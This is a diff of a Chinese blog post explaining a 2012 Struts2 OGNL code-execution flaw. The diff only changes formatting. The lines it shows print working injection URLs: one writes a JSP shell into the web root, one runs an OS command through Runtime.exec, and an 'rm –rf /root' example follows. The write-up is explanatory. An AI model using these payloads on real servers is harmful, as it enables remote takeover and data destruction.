@@ -1,7 +1,6 @@
 title: struts2代码执行漏洞
 id: 129
-categories:
-  - java
+categories: java
 date: 2012-01-09 14:02:19
 tags:
 ---
@@ -26,19 +25,19 @@ Struts2的核心是使用的WebWork，处理Action时通过ParametersInterceptor
 
 处理请求配置这样
 
-&lt;action name=&quot;Test&quot; class=&quot;example.Test&quot;&gt; 
-</br>&nbsp;&nbsp;&nbsp; &lt;result name=&quot;input&quot;&gt;test.jsp&lt;/result&gt; 
+&lt;action name=&quot;Test&quot; class=&quot;example.Test&quot;&gt;
+</br>&nbsp;&nbsp;&nbsp; &lt;result name=&quot;input&quot;&gt;test.jsp&lt;/result&gt;
 </br>&lt;/action&gt;
 
 通过ONGL就可以转换成
 
-/Test.action?id='%2b(new+java.io.BufferedWriter(new+java.io.FileWriter(&quot;C:/wwwroot/sec-consult.jsp&quot;)).append(&quot;jsp+shell&quot;).close())%2b' 
+/Test.action?id='%2b(new+java.io.BufferedWriter(new+java.io.FileWriter(&quot;C:/wwwroot/sec-consult.jsp&quot;)).append(&quot;jsp+shell&quot;).close())%2b'
 
 oh！god！系统权限就有了，想干什么，就可以干什么了。
 
 或者这样
 
-/Test.action?id='%2b(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@java.lang.Runtime@getRuntime().exec('calc'))%2b' 
+/Test.action?id='%2b(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@java.lang.Runtime@getRuntime().exec('calc'))%2b'
 
 想执行什么就可以执行什么了。比如 rm –rf /root..
 
